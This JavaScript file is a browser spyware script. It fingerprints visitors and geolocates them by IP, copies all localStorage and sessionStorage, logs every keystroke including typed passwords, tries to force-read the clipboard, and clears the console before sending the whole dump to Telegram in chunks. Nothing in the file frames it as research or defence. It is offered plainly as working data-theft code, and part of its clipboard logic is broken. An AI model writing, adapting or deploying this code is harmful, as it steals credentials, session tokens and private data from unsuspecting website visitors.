
function mainData() {


    const now = new Date();
    const userData = {
        Time: `${now.getHours()}Hrs:${now.getMinutes()}Mins:${now.getSeconds()}seconds on ${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}`,
        collectionVersion: '1.0.0',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        locale: navigator.language,
        timezoneOffset: now.getTimezoneOffset()
    };


    window.addEventListener("error", (e) => {
        userData.resourceErrors = userData.resourceErrors || [];
        userData.resourceErrors.push({
            src: e.target.src || e.target.href,
            tag: e.target.tagName
        });
    }, true);



    // ==== [0. IP ADDRESS & NETWORK INFO] ==== //
    function collectNetworkInfo() {
        return new Promise((resolve) => {
            userData.networkInfo = {
                // Will be populated by the async IP lookup
                ipAddress: null,
                isp: null,
                asn: null,
                organization: null,
                country: null,
                region: null,
                city: null,
                postalCode: null,
                latitude: null,
                longitude: null,
                timezone: null,
                // Local network info
                localIPs: null,
                networkInterfaces: null
            };

            // Public IP and ISP detection using a third-party service
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    userData.networkInfo.ipAddress = data.ip;
                    userData.networkInfo.isp = data.org;
                    userData.networkInfo.asn = data.asn;
                    userData.networkInfo.organization = data.org;
                    userData.networkInfo.country = data.country_name;
                    userData.networkInfo.region = data.region;
                    userData.networkInfo.city = data.city;
                    userData.networkInfo.postalCode = data.postal;
                    userData.networkInfo.latitude = data.latitude;
                    userData.networkInfo.longitude = data.longitude;
                    userData.networkInfo.timezone = data.timezone;
                    resolve(data.city)
                })
                .catch(error => {
                    userData.networkInfo.error = "IP lookup failed";
                    resolve(null)
                });

            // Try to get local IP addresses (works in some browsers)
            try {
                RTCPeerConnection.getLocalIPs = function (callback) {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer))
                        .then(() => {
                            const lines = pc.localDescription.sdp.split('\n');
                            const ips = [];
                            lines.forEach(line => {
                                if (line.indexOf('candidate') === 0) {
                                    const parts = line.split(' ');
                                    if (parts[7] === 'host') {
                                        ips.push(parts[4]);
                                    }
                                }
                            });
                            callback(ips);
                        });
                };

                RTCPeerConnection.getLocalIPs(function (ips) {
                    userData.networkInfo.localIPs = ips;
                });
            } catch (e) {
                userData.networkInfo.localIPError = e.message;
            }

            // Network interfaces (if available)
            if (navigator.connection && navigator.connection.getNetworkInterfaces) {
                navigator.connection.getNetworkInterfaces()
                    .then(interfaces => {
                        userData.networkInfo.networkInterfaces = interfaces;
                    })
                    .catch(e => {
                        userData.networkInfo.interfaceError = e.message;
                    });
            }

            return userData.networkInfo.city;
        });

    }

    // ==== [1. BASIC BROWSER INFO] ==== //
    function collectBasicInfo() {

        async function checkPermissions() {
            userData.permissions = {
                geolocation: await navigator.permissions.query({ name: "geolocation" }),
                notifications: await navigator.permissions.query({ name: "notifications" })
            };
        }
        checkPermissions();


        userData.basicInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            webdriver: navigator.webdriver,
            vendor: navigator.vendor,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation && screen.orientation.type,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            localStorageEnabled: !!window.localStorage,
            sessionStorageEnabled: !!window.sessionStorage,
            indexedDBEnabled: !!window.indexedDB,
            webGLInfo: getWebGLInfo(),
            connectionInfo: null
        };

        if ('connection' in navigator) {
            const connection = navigator.connection;
            userData.basicInfo.connectionInfo = {
                downlink: connection.downlink,
                effectiveType: connection.effectiveType,
                rtt: connection.rtt,
                saveData: connection.saveData,
                type: connection.type
            };
        }
    }

    // ==== [2. WEBGL FINGERPRINTING] ==== //
    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                parameters: Object.fromEntries(
                    ['MAX_TEXTURE_IMAGE_UNITS', 'MAX_VERTEX_TEXTURE_IMAGE_UNITS',
                        'MAX_RENDERBUFFER_SIZE', 'MAX_VARYING_VECTORS', 'MAX_VERTEX_ATTRIBS']
                        .map(param => [param, gl.getParameter(gl[param])]))
            };
        } catch (e) {
            return null;
        }
    }

    // ==== [3. SOCIAL MEDIA (FIXED)] ==== //
    function checkSocialMediaLogins() {
        userData.socialMedia = {
            facebook: !!window.FB,
            twitter: !!window.twttr,
            google: !!window.gapi,
            linkedin: !!window.LI,
            instagram: !!window._instgrm,
            reddit: !!window.rte
        };
    }

    // ==== [4. LOCALSTORAGE (RAW DATA)] ==== //
    function collectStorageData() {
        try {
            userData.localStorage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                userData.localStorage[key] = localStorage.getItem(key); // Full unredacted data
            }

            userData.sessionStorage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                userData.sessionStorage[key] = sessionStorage.getItem(key); // Full unredacted data
            }
        } catch (e) {
            userData.storageError = e.message;
        }
    }

    // ==== [5. KEYSTROKE LOGGING (FULL)] ==== //
    function collectBehavioralData() {
        userData.behavior = {
            keyPresses: []
        };

        document.addEventListener('keydown', (e) => {
            userData.behavior.keyPresses.push({
                key: e.key,       // Full key logs (including special keys)
                code: e.code,
                time: Date.now(),
                target: e.target.tagName,
                isFormField: ['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName),
                value: e.target.value // Includes typed content (even passwords)
            });
        });
    }

    // ==== [6. CLIPBOARD (FORCE-READ)] ==== //
    function collectClipboardData() {
        // Method 1: Modern API (may trigger prompts)

        function forceClipboardRead() {
            navigator.clipboard.readText()
                .then(text1 => {
                    console.log("Clipboard:", text1);
                    return text1;
                })
                .catch(error => console.error("Blocked by browser:", error));
        }

        try {
            var dataToReturn = forceClipboardRead();
            userData.clipboard = {
                text: dataToReturn,
                length: dataToReturn.length
            }
        }
        catch (error) {
            console.log("Error caught and passed")
        }

        if (dataToReturn == undefined || dataToReturn == null) {
            if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                navigator.clipboard.readText()
                    .then(text => {
                        userData.clipboard = {
                            text: text,     // Full clipboard content
                            length: text.length
                        };
                        dataToReturn = text;
                    })
                    .catch(e => {
                        // Fallback to Method 2 if denied
                        forceClipboardRead();
                    });
            } else {
                // Method 2: Legacy execCommand (Safari)
                forceClipboardRead();
            }
        }
    }


    function forceClipboardRead() {
        const textarea = document.createElement('textarea');
        textarea.style.position = 'fixed';
        document.body.appendChild(textarea);
        textarea.focus();
        try {
            if (document.execCommand('paste')) {
                userData.clipboard = {
                    text: textarea.value,
                    length: textarea.value.length
                };
            }

        } catch (e) {
            userData.clipboardError = "Clipboard blocked";
        }
        document.body.removeChild(textarea);
    }

    // ==== [7. CANVAS/AUDIO FINGERPRINTING] ==== //
    function collectCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 2000;
            canvas.height = 200;
            const ctx = canvas.getContext('2d');
            ctx.fillText("Canvas Fingerprint", 50, 50);
            userData.canvasFingerprint = canvas.toDataURL(); // Full image data
        } catch (e) {
            userData.canvasError = e.message;
        }
    }

    mainData.onlyCanvasFingerprintingData = function () {
        var canvaData = collectCanvasFingerprint(manual = true);
    };

    // ==== [8. ADDITIONAL PRECISE TRACKING METHODS] ==== //
    function collectAdditionalTrackingData() {
        // Battery status API
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                userData.batteryInfo = {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            });
        }

        // Device orientation and motion
        if ('DeviceOrientationEvent' in window) {
            window.addEventListener('deviceorientation', (event) => {
                userData.deviceOrientation = {
                    alpha: event.alpha,
                    beta: event.beta,
                    gamma: event.gamma
                };
            }, true);
        }

        if ('DeviceMotionEvent' in window) {
            window.addEventListener('devicemotion', (event) => {
                userData.deviceMotion = {
                    acceleration: event.acceleration,
                    accelerationIncludingGravity: event.accelerationIncludingGravity,
                    rotationRate: event.rotationRate,
                    interval: event.interval
                };
            }, true);
        }

        // Media devices enumeration
        if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
            navigator.mediaDevices.enumerateDevices()
                .then(devices => {
                    userData.mediaDevices = devices.map(device => ({
                        kind: device.kind,
                        label: device.label,
                        deviceId: device.deviceId,
                        groupId: device.groupId
                    }));
                })
                .catch(e => {
                    userData.mediaDevicesError = e.message;
                });
        }

        // Bluetooth availability
        if ('bluetooth' in navigator) {
            userData.bluetoothAvailable = true;
        }

        // USB availability
        if ('usb' in navigator) {
            userData.usbAvailable = true;
        }

        // Gamepad API
        if ('getGamepads' in navigator) {
            const gamepads = navigator.getGamepads();
            if (gamepads && gamepads.length > 0) {
                userData.gamepads = [];
                for (let i = 0; i < gamepads.length; i++) {
                    if (gamepads[i]) {
                        userData.gamepads.push({
                            id: gamepads[i].id,
                            index: gamepads[i].index,
                            connected: gamepads[i].connected,
                            mapping: gamepads[i].mapping,
                            axes: Array.from(gamepads[i].axes),
                            buttons: gamepads[i].buttons.map(b => ({
                                pressed: b.pressed,
                                touched: b.touched,
                                value: b.value
                            }))
                        });
                    }
                }
            }
        }

        // Speech recognition
        if ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) {
            userData.speechRecognitionSupported = true;
        }

        // WebRTC IP leak detection (more detailed than the basic one above)
        try {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {
                if (ice.candidate) {
                    const candidate = ice.candidate.candidate;
                    if (candidate.indexOf('srflx') !== -1) {
                        const ip = candidate.split(' ')[4];
                        if (!userData.networkInfo.webrtcIPs) {
                            userData.networkInfo.webrtcIPs = [];
                        }
                        if (userData.networkInfo.webrtcIPs.indexOf(ip) === -1) {
                            userData.networkInfo.webrtcIPs.push(ip);
                        }
                    }
                }
            };
            setTimeout(() => {
                pc.close();
            }, 1000);
        } catch (e) {
            userData.webrtcError = e.message;
        }
    }

    // ==== [INITIALIZE] ==== //
    async function collectAllData() {


        const cityName = await collectNetworkInfo(); // Added IP and ISP collection
        collectClipboardData();
        collectBasicInfo();
        collectStorageData();
        checkSocialMediaLogins();
        collectBehavioralData();

        // Simple city check - only run canvas if NOT Raipur
        if (!cityName || cityName.toLowerCase() !== "raipur") {
            collectCanvasFingerprint();
        }

        collectAdditionalTrackingData()

        // Add this chunk splitting function
        function splitIntoChunks(text, maxLength = 4000) {
            const chunks = [];
            for (let i = 0; i < text.length; i += maxLength) {
                chunks.push(text.substring(i, i + maxLength));
            }
            return chunks;
        }

        // Modified sending function
        async function sendDeatilsToTelegram1(message) {
            const chunks = splitIntoChunks(message);

            for (const [index, chunk] of chunks.entries()) {
                await sendDeatilsToTelegram(`Part ${index + 1}/${chunks.length}\n${chunk}`);
            }
        }



        setTimeout(async () => { // Make this async
            try {
                const formattedData = JSON.stringify(userData, null, 2);
                // alert(formattedData.length)
                console.clear()
                await sendDeatilsToTelegram1(formattedData); // Add await
            } catch (error) {
                console.log("Error loading fetcher", error);
            }
        }, 1500);
    }
    collectAllData();
};